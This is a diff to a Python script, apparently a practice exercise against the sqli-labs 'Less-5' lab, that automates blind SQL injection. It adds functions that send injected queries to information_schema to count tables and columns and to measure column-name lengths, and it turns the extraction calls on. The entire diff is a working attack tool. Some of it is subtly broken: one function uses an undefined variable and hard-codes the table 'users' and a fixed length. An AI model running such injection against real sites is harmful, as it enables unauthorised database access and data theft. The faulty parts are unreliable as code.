@@ -96,20 +96,39 @@ def get_table_name(pattern: str, table_name_len_list: List) -> List:
         limit_begin_index = limit_begin_index + 1
     return table_name_list
 
-# TODO
-def get_column_num(url: str) -> int:
-    return 0
+def get_column_num(table_name_list: List, pattern: str) -> Dict[str, int]:
+    column_num_dict: Dict = {}
+    for table_name in table_name_list:
+        column_num: int = 0
+        while True:
+            url_str: str = f"/Less-5/?id=1' and (select length(group_concat(column_name)) - length(replace(group_concat(column_name), ',', '')) from information_schema.columns where table_name ='{table_name}') = {column_num}"
+            url_str = LAB_ROOT_URL + url_str + SQL_COMMENT
+            print(f'Try to get the column num: {url_str}')
+            if get_method(url=url_str, pattern=pattern):
+                column_num_dict[table_name] = column_num + 1
+                break
+            column_num = column_num + 1
+        print(f'The column num had been got: {column_num_dict}')
+    return column_num_dict
 
 # TODO
-def get_column_name_len(column_num: int) -> List[int]:
-    column_name_len: int = 0
-    column_name_len_list: List = []
-    limit_begin_index: int = 0
-    while len(column_name_len_list) < column_num:
-        url: str = "/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name = 'users' limit 0, 1)) = 2"
-        url = LAB_ROOT_URL + url + SQL_COMMENT
-        pass
-    return []
+def get_column_name_len(column_num_dict: Dict[str, int], pattern: str) -> Dict[str, Dict[int, List[int]]]:
+    column_name_len_dict: Dict[str, Dict[int, List[int]]] = {}
+    for table_name, table_colmun_num in column_num_dict.items():
+        temp_column_name_len: int = 0
+        temp_limit_begin_index: int = 0
+        temp_column_name_list: List[int] = []
+        while len(temp_column_name_list) < table_colmun_num:
+            url: str = f"/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name = 'users' limit {limit_begin_index}, 1)) = 2"
+            url = LAB_ROOT_URL + url + SQL_COMMENT
+            print(f'Try to get the column name len: {url}')
+            if get_method(url=url, pattern=pattern):
+                temp_column_name_list.append(temp_column_name_len)
+                temp_limit_begin_index = temp_limit_begin_index + 1
+            temp_column_name_len = temp_column_name_len + 1
+        column_name_len_dict[table_name] = {table_colmun_num: temp_column_name_list}
+        print(f'The column name len had been got: {column_name_len_dict}')
+    return column_name_len_dict
 
 # TODO
 def get_column_name(pattern: str, column_name_len_list: List[int], table_name_list: List[str]) -> List:
@@ -146,8 +165,9 @@ def get_data() -> None:
 # table_name_len_list: List = get_table_name_len(table_num=4)
 # print(f'The table name length: {table_name_len_list}')
 
-# get_table_num_url: str = "/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) - LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = "
-# table_name_list: List = get_table_name(pattern='You are in', table_name_len_list=get_table_name_len(table_num=get_table_num(url=get_table_num_url)))
-# print(f'The table name list: {table_name_list}')
+get_table_num_url: str = "/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) - LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = "
+table_name_list: List = get_table_name(pattern='You are in', table_name_len_list=get_table_name_len(table_num=get_table_num(url=get_table_num_url)))
+print(f'The table name list: {table_name_list}\n\n')
 
-# column_name_list: List = get_column_name(pattern='You are in', table_name_list=get_table_name)
+column_num_dict = get_column_num(table_name_list=table_name_list, pattern='You are in')
+print(f'The column num dict: {column_num_dict}')
